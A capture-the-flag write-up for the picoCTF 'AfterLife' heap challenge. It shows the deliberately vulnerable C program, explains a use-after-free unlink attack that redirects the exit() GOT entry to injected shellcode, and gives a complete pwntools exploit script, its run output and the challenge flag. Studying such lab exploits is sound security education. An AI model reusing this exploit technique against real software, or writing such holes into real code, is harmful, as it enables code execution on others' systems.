# AfterLife
Binary Exploitation, 400 points

## Description:
> Just pwn this program and get a flag.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

int main(int argc, char *argv[])
{
   //This is rather an artificial pieace of code taken from Secure Coding in c by Robert C. Seacord 
   char *first, *second, *third, *fourth;
   char *fifth, *sixth, *seventh;
   first=malloc(256);
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",first);
   strncpy(first,argv[1],LINE_BUFFER_SIZE);
   second=malloc(256);
   third=malloc(256);
   fourth=malloc(256);
   free(first);
   free(third);
   fifth=malloc(128);
   puts("you will write on first after it was freed... an overflow will not be very useful...");
   gets(first);
   seventh=malloc(256);
   exit(0);
}

```

Hints:

* If you understood the double free, a use after free should not be hard! http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf

## Solution:

As mentioned in the comment, this is an artificial example taken from [Secure Coding in C and C++](https://www.amazon.com/Secure-Coding-2nd-Software-Engineering/dp/0321822137). A complete analysis of the example exists in the book, and this writeup is inspired by it.

The vulnerability here is *use after free*: 

```c
free(first); // <-- 'first' is freed
free(third);
fifth=malloc(128);
puts("you will write on first after it was freed... an overflow will not be very useful...");
gets(first); // <-- 'first' is used
```

The setup is very similar to [SecondLife](SecondLife.md). This time, we are able to directly overwrite a chunk which is already located in one of the bins. We overwrite it with the exact same payload as before:

```python
payload = p32(exe.got["exit"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols["win"])))
```

This will cause the buffer to look like:
```
                                Buffer                          Legend
                                +------------------------+---+  +------------------------+---+
                                | Size of chunk          | 0 |  | Size of chunk          | 0 |
Pointer returned by malloc -->  +------------------------+---+  +------------------------+---+
                                | exe.got["exit"] - 12       |  | Forward Pointer            |
                                +----------------------------+  +----------------------------+
                            +---| address + 8                |  | Back Pointer               |
                            +-> +----------------------------+  +----------------------------+
                                | push 'win'; ret;           |  | Unused                     |
                                |                            |  |                            |
                                +----------------------------+  +----------------------------+
                                | Size of chunk              |  | Size of chunk              |
                                +----------------------------+  +----------------------------+
```

We add 8 bytes to `address` (which is the base address of the first buffer) since that's where we located our shellcode, right after `p32(exe.got["exit"] - 12) + p32(address + 8)`.

We continue with:
```c
seventh=malloc(256);
```

The heap manager goes to the appropriate bin and fetches the 'first' chunk in order to return it to the user. Therefore, the chunk should be removed from the linked list by calling `unlink`:
```c
FD = P->fd;  // FD points to (exe.got["exit"] - 12), since that's the value we overran the buffer with
BK = P->bk;  // BK points to (address of first + 8), since that's the value we overran the buffer with
FD->bk = BK; // (exe.got["exit"] - 12) + 12 = (address of first + 8); We wrote an arbitrary DWORD to an arbitrary location
BK->fd = FD; // (address of first + 8) + 8 = (exe.got["exit"] - 12); Side effect
```

The `unlink` macro allowed us to overwrite the .got.plt address of `exit` with the address of our shellcode. Notice that as a side-effect, a part of the buffer was overwritten. Since our shellcode is very short, it won't be corrupted. If it was longer, we would have had to use a trampoline as demonstrated in [Heap overflow](Heap_overflow.md).

Now, when we call `exit`, our shellcode gets called instead and gives us the flag.

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start(["arg1"])

io.recvuntil("Oops! a new developer copy pasted and printed an address as a decimal...\n")
address = int(io.recvline())

log.info("Address of buffer: {}".format(hex(address)))
log.info("Address of exit(): {}".format(hex(exe.got["exit"])))
log.info("Address of win(): {}".format(hex(exe.symbols["win"])))

payload = p32(exe.got["exit"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols["win"])))
log.info("payload:\n{}".format(hexdump(payload)))

io.sendlineafter("you will write on first after it was freed... an overflow will not be very useful...", payload)
print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/AfterLife# python exploit.py
[*] '/media/sf_CTFs/pico/AfterLife/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.OSZrQeZjJT'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215'
[+] Starting remote process '/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215/vuln' on 2019shell1.picoctf.com: pid 1137324
[*] Address of buffer: 0x9b58008
[*] Address of exit(): 0x804d02c
[*] Address of win(): 0x8048966
[*] payload:
    00000000  20 d0 04 08  10 80 b5 09  68 66 89 04  08 c3        │ ···│····│hf··│··│
    0000000e
[+] Receiving all data: Done (31B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1137324)

picoCTF{what5_Aft3r_187f3d9a}
```